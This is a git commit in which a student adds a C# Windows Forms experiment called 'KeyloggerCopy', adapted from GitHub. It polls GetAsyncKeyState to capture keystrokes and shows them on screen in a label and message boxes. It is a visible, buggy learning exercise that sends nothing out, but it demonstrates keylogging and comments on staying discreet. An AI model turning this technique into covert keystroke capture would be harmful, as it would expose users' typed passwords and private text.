53980ebe5892310ca5ac0c7cd01b0a127e0e1c26
samuelroland <samuel.roland@cpnv.ch>
2019-10-23 21:31:39 +0200

    keyloggerCopy créé et test d'adapter en version graphique.
    code tiré d'un repos github...

---
+++ Z-Exos-supp-et-persos/KeyloggerCopy/KeyloggerCopy/Form1.Designer.cs
@@ -0,0 +1,82 @@
+﻿namespace KeyloggerCopy
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variable nécessaire au concepteur.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Nettoyage des ressources utilisées.
+        /// </summary>
+        /// <param name="disposing">true si les ressources managées doivent être supprimées ; sinon, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Code généré par le Concepteur Windows Form
+
+        /// <summary>
+        /// Méthode requise pour la prise en charge du concepteur - ne modifiez pas
+        /// le contenu de cette méthode avec l'éditeur de code.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.lbl1 = new System.Windows.Forms.Label();
+            this.tmr1 = new System.Windows.Forms.Timer(this.components);
+            this.btnLancer = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // lbl1
+            // 
+            this.lbl1.Location = new System.Drawing.Point(3, 9);
+            this.lbl1.Name = "lbl1";
+            this.lbl1.Size = new System.Drawing.Size(774, 432);
+            this.lbl1.TabIndex = 0;
+            this.lbl1.Text = "...txt de logs....";
+            // 
+            // tmr1
+            // 
+            this.tmr1.Enabled = true;
+            this.tmr1.Interval = 10;
+            this.tmr1.Tick += new System.EventHandler(this.Tmr1_Tick);
+            // 
+            // btnLancer
+            // 
+            this.btnLancer.Location = new System.Drawing.Point(6, 415);
+            this.btnLancer.Name = "btnLancer";
+            this.btnLancer.Size = new System.Drawing.Size(75, 23);
+            this.btnLancer.TabIndex = 1;
+            this.btnLancer.Text = "Lancer !";
+            this.btnLancer.UseVisualStyleBackColor = true;
+            this.btnLancer.Click += new System.EventHandler(this.BtnLancer_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.btnLancer);
+            this.Controls.Add(this.lbl1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label lbl1;
+        private System.Windows.Forms.Timer tmr1;
+        private System.Windows.Forms.Button btnLancer;
+    }
+}
+
---
+++ Z-Exos-supp-et-persos/KeyloggerCopy/KeyloggerCopy/Form1.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace KeyloggerCopy
+{
+    public partial class Form1 : Form
+    {  
+        // variables du Keylogger
+        [DllImport("user32.dll")] //Le DLL est nécessaire pour fonctionner
+        public static extern int GetAsyncKeyState(Int32 i); //Permet d'obtenir l'état du clavier en temps réel
+        static string logs = "";
+        bool test=false;
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+        int nbticks = 0;
+        private void Tmr1_Tick(object sender, EventArgs e)
+        {
+            nbticks++;
+        }
+
+        private void BtnLancer_Click(object sender, EventArgs e)
+        {
+            test = !test;
+            btnLancer.Text += "*";
+            ecouter();
+        }
+
+        void ecouter()
+        {
+            while (nbticks<300)
+            {
+                Thread.Sleep(10); // On attend 10 ms pour éviter de consommer trop de ressources et rester discret
+                for (byte i = 0; i < 255; i++) //on va boucler pour chaque caractère du clavier (on choisit byte car on va de 0 à 254 et la plage de byte va de 0 à 255)
+                {
+                    int keyState = GetAsyncKeyState(i); // On récupère l'état de touche à l'index i
+                    if (keyState == 1 || keyState == -32767)
+                    // keyState == -32767 (lol:p) renvoie True quand la touche d'index i est pressée 
+                    // keyState == 1 renvoie True dans le cas éventuel et très peu probable que le quidam arrive à taper et retirer le doigt entre cette
+                    // instruction et l'instruction précedente (enfin bon, sait-on jamais^^)
+                    {
+                        lbl1.Text += (Keys)i; // On stocke dans logs au fur et à mesure
+                        MessageBox.Show(lbl1.Text + (Keys)i);
+                        break; // Et on arrête la boucle
+                    }
+                    else
+                    {
+                        MessageBox.Show(" 2 "+ lbl1.Text + (Keys)i);
+                    }
+                }
+            }
+        }
+    }
+}
